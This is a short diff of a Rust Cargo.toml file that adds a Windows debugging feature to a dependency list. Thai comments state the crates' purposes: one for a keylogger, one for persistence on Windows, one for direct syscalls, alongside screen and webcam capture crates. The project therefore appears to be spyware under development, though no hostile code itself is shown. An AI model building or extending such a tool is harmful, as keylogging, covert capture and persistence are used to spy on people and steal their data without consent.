@@ -21,4 +21,4 @@ scrap = "0.5"
 nokhwa = "0.10"
 rdev = "0.5"  # สำหรับ keylogger
 winreg = "0.52"  # สำหรับ persistence บน Windows
-windows = { version = "0.52", features = ["Win32_System_Threading", "Win32_Foundation"] }  # สำหรับ direct syscalls
+windows = { version = "0.52", features = ["Win32_System_Threading", "Win32_Foundation", "Win32_System_Diagnostics_Debug"] }  # สำหรับ direct syscalls
